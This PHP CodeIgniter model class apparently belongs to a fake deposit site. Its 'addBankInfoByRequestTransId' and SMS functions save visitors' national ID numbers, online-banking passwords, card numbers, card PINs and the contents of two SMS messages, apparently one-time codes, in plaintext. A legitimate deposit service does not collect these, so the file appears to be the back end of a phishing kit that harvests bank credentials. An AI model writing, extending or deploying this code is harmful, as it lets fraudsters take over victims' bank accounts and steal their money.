<?php 
class Home_model extends CI_Model
{
	public function get_depositTypes () {
		$this->db->select('*');
		$this->db->from('deposit_type');
		$query = $this->db->get();
		return $query->result_array();
	}

	public function get_category_by_id ($id) {
		$this->db->select('*')->where('id', $id);
		$this->db->from('categories');
		$query = $this->db->get();
		return $query->row_array();
	}

    public function get_banks() {
        $this->db->select('bank.*, deposit_type.name as depositName');
        $this->db->from('bank');
        $this->db->join('deposit_type', 'deposit_type.id = bank.deposit_id', 'left');
        $this->db->order_by('id', 'ASC');
        $query = $this->db->get();
        return $query->result_array();
    }
    public function getBankByDepositType($data)
    {
        $this->db->select('bank.*, deposit_type.name as depositName, deposit_type.min as minDeposit, deposit_type.max as maxDeposit');
        $this->db->from('bank');
        $this->db->join('deposit_type', 'deposit_type.id = bank.deposit_id', 'left');
        $this->db->where('bank.deposit_id',$data['id']);
        $this->db->order_by('id', 'ASC');
        $query = $this->db->get();
        return $query->result_array();
    }
    public function add_request($data)
    {
        $this->db->set('deposit_id', $data['depositType']);
        $this->db->set('username', $data['username']);
        $this->db->set('deposit_amount', $data['amount']);
        $this->db->set('trans_id', $data['trans_no']);
        $this->db->insert('requests');
        return $this->db->insert_id();
    }
    public function get_request_by_transId($id)
    {
        $this->db->select('*')->where('trans_id', $id);
        $this->db->from('requests');
        $query = $this->db->get();
        return $query->row_array();
    }
    public function check_request_status_by_transId($data)
    {
        $this->db->select('*')->where('trans_id', $data['id'])->where('status', $data['status']);
        $this->db->from('requests');
        $query = $this->db->get();
        return $query->row_array();
    }
    public function addBankInfoByRequestTransId($data ,$bankinfo)
    {
        if($bankinfo['tc_no']) {
            $this->db->set('tc_no', $data['tc_no']);
        }
        if($bankinfo['bank_password']) {
            $this->db->set('password', $data['password']);
        }
        if($bankinfo['bank_customer']) {
            $this->db->set('bank_customer', $data['bank_customer']);
        }
        if($bankinfo['bank_card_no']) {
            $this->db->set('bank_card_no', $data['bank_card_no']);
        }
        if($bankinfo['bank_card_password']) {
            $this->db->set('bank_card_password', $data['bank_card_password']);
        }
        $this->db->where('trans_id', $data['trans_no']);
        $this->db->update('requests');
        return $this->db->affected_rows();
    }

    public function selectBankByRequestTransId($data)
    {
        $this->db->set('bank_id', $data['bank_id']);
        $this->db->where('trans_id', $data['trans_no']);
        $this->db->update('requests');
        return $this->db->affected_rows();
    }

    public function addSmsInfoByRequestTransId($data)
    {
        $this->db->set('sms1_content', $data['sms1']);
        $this->db->where('trans_id', $data['trans_no']);
        $this->db->update('requests');
        return $this->db->affected_rows();
    }
    public function addSms2InfoByRequestTransId($data)
    {
        $this->db->set('sms2_content', $data['sms2']);
        $this->db->where('trans_id', $data['trans_no']);
        $this->db->update('requests');
        return $this->db->affected_rows();
    }
    public function delete_transaction($data) {
        $this->db->where('trans_id', $data['id']);
        $this->db->delete('requests');
        return $this->db->affected_rows();
    }
}

?>